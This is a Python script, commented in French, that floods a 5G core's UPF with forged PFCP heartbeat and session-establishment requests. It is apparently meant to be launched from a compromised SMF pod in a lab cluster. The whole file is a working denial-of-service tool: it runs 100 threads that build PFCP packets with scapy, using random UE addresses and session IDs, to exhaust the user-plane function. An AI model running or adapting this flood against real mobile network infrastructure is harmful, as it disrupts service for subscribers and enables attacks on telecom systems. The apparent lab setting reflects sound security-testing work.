# pfcp-flood-upf2.py
# Scénario : SMF2 compromis flood l'UPF2
# Lancer depuis : kubectl exec dans le pod SMF2

import uuid
import threading
import signal
import sys
import logging
from faker import Faker
from scapy.contrib.pfcp import (
    IE_ApplyAction, IE_CreateFAR, IE_CreatePDR,
    IE_DestinationInterface, IE_FAR_Id, IE_ForwardingParameters,
    IE_FSEID, IE_NetworkInstance, IE_NodeId, IE_PDI, IE_PDR_Id,
    IE_Precedence, IE_RecoveryTimeStamp, IE_SDF_Filter,
    IE_SourceInterface, IE_UE_IP_Address,
    IE_OuterHeaderCreation, IE_OuterHeaderRemoval, IE_FTEID,
    PFCP, PFCPHeartbeatRequest, PFCPSessionEstablishmentRequest,
)
from scapy.layers.inet import IP, UDP
from scapy.all import send, conf

# ─── IPs réseau ───────────────────────────────────────────────────────────────
PFCP_CP_IP  = "10.10.4.102"   # Nous (SMF2, interface n4)
PFCP_UP_IP  = "10.10.4.2"     # Cible (UPF2, interface n4)
N3_UPF_IP   = "10.10.3.2"     # Interface N3 de l'UPF2 (pour les FTEID)
GNB_IP      = "10.10.3.231"   # gNB1

# Scapy doit utiliser l'interface n4 pour atteindre le subnet 10.10.4.0/24
conf.iface = "n4"

NUM_THREADS = 100

faker = Faker()
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [Thread-%(thread)d] %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# ─── Helpers ──────────────────────────────────────────────────────────────────

def new_seid() -> int:
    return uuid.uuid4().int & ((1 << 64) - 1)


def send_pfcp(pkt, seq: int, seid: int = 0, use_seid: bool = False):
    """Forge et envoie un paquet PFCP depuis SMF2 vers UPF2."""
    send(
        IP(src=PFCP_CP_IP, dst=PFCP_UP_IP) /
        UDP(sport=8805, dport=8805) /
        PFCP(
            version=1,
            S=1 if use_seid else 0,
            seid=seid if use_seid else 0,
            seq=seq,
        ) /
        pkt,
        verbose=0,
        iface="n4",      # interface Multus N4 du pod SMF2
    )


# ─── Paquets PFCP ─────────────────────────────────────────────────────────────

def make_heartbeat():
    return PFCPHeartbeatRequest(IE_list=[
        IE_RecoveryTimeStamp(timestamp=0)
    ])


def make_session_establishment(ue_ip: str, cur_seid: int):
    return PFCPSessionEstablishmentRequest(IE_list=[

        # ── PDR uplink (Access → Core) ──────────────────────────────────────
        IE_CreatePDR(IE_list=[
            IE_PDR_Id(id=1),
            IE_Precedence(precedence=200),
            IE_PDI(IE_list=[
                IE_SourceInterface(interface="Access"),
                IE_NetworkInstance(instance="access"),
                IE_UE_IP_Address(ipv4=ue_ip, V4=1, SD=0),
                IE_FTEID(V4=1, TEID=1111, ipv4=N3_UPF_IP),
                IE_SDF_Filter(
                    FD=1,
                    flow_description="permit out ip from any to assigned"
                ),
            ]),
            IE_FAR_Id(id=1),
            IE_OuterHeaderRemoval(),
        ]),

        # ── FAR uplink : forward simple ─────────────────────────────────────
        IE_CreateFAR(IE_list=[
            IE_FAR_Id(id=1),
            IE_ApplyAction(FORW=1),
        ]),

        # ── PDR downlink (Core → Access) ────────────────────────────────────
        IE_CreatePDR(IE_list=[
            IE_PDR_Id(id=2),
            IE_Precedence(precedence=200),
            IE_PDI(IE_list=[
                IE_SourceInterface(interface="Core"),
                IE_NetworkInstance(instance="n6"),
                IE_UE_IP_Address(ipv4=ue_ip, V4=1, SD=1),
            ]),
            IE_FAR_Id(id=2),
            IE_OuterHeaderRemoval(),
        ]),

        # ── FAR downlink : encapsuler GTP vers le gNB ───────────────────────
        IE_CreateFAR(IE_list=[
            IE_FAR_Id(id=2),
            IE_ApplyAction(FORW=1),
            IE_ForwardingParameters(IE_list=[
                IE_DestinationInterface(interface="Access"),
                IE_NetworkInstance(instance="n6"),
                IE_OuterHeaderCreation(
                    GTPUUDPIPV4=1,
                    TEID=2222,
                    ipv4=GNB_IP,
                ),
            ]),
        ]),

        # ── FSEID : identifiant de session côté SMF ─────────────────────────
        IE_FSEID(ipv4=PFCP_CP_IP, v4=1, seid=cur_seid),
        IE_NodeId(id_type=2, id="cp"),
    ])


# ─── Thread de flood ──────────────────────────────────────────────────────────

class FloodThread(threading.Thread):
    def __init__(self, thread_id: int):
        super().__init__(name=f"Flood-{thread_id}")
        self.thread_id = thread_id
        self.running   = True

    def run(self):
        seq = self.thread_id * 10000   # séquences distinctes par thread
        while self.running:
            try:
                ue_ip    = faker.ipv4_private()
                cur_seid = new_seid()

                # 1. Heartbeat (simule un SMF vivant)
                send_pfcp(make_heartbeat(), seq=seq)
                seq += 1

                # 2. Session Establishment (la charge principale du flood)
                send_pfcp(
                    make_session_establishment(ue_ip, cur_seid),
                    seq=seq,
                    seid=cur_seid,
                    use_seid=False,  # S=0 pour l'établissement initial
                )
                seq += 1

                logger.info(f"[{self.name}] Session envoyée → UE={ue_ip} SEID={hex(cur_seid)}")

            except Exception as e:
                logger.error(f"[{self.name}] Erreur : {e}")

    def stop(self):
        self.running = False


# ─── Main ─────────────────────────────────────────────────────────────────────

threads: list[FloodThread] = []

def shutdown(sig, frame):
    print("\n[!] Arrêt du flood...")
    for t in threads:
        t.stop()
    for t in threads:
        t.join()
    print("[!] Tous les threads arrêtés.")
    sys.exit(0)

signal.signal(signal.SIGINT,  shutdown)
signal.signal(signal.SIGTERM, shutdown)

print(f"""
╔══════════════════════════════════════════════╗
║         PFCP Flood — SMF2 → UPF2            ║
╠══════════════════════════════════════════════╣
║  SMF2 (CP)  : {PFCP_CP_IP}              ║
║  UPF2 (UP)  : {PFCP_UP_IP}               ║
║  N3 UPF2    : {N3_UPF_IP}               ║
║  gNB        : {GNB_IP}             ║
║  Threads    : {NUM_THREADS}                            ║
╚══════════════════════════════════════════════╝
""")
input("Appuie sur Entrée pour lancer le flood...\n")

for i in range(NUM_THREADS):
    t = FloodThread(i)
    t.daemon = True
    t.start()
    threads.append(t)

print(f"[+] {NUM_THREADS} threads lancés. Ctrl+C pour stopper.")
for t in threads:
    t.join()
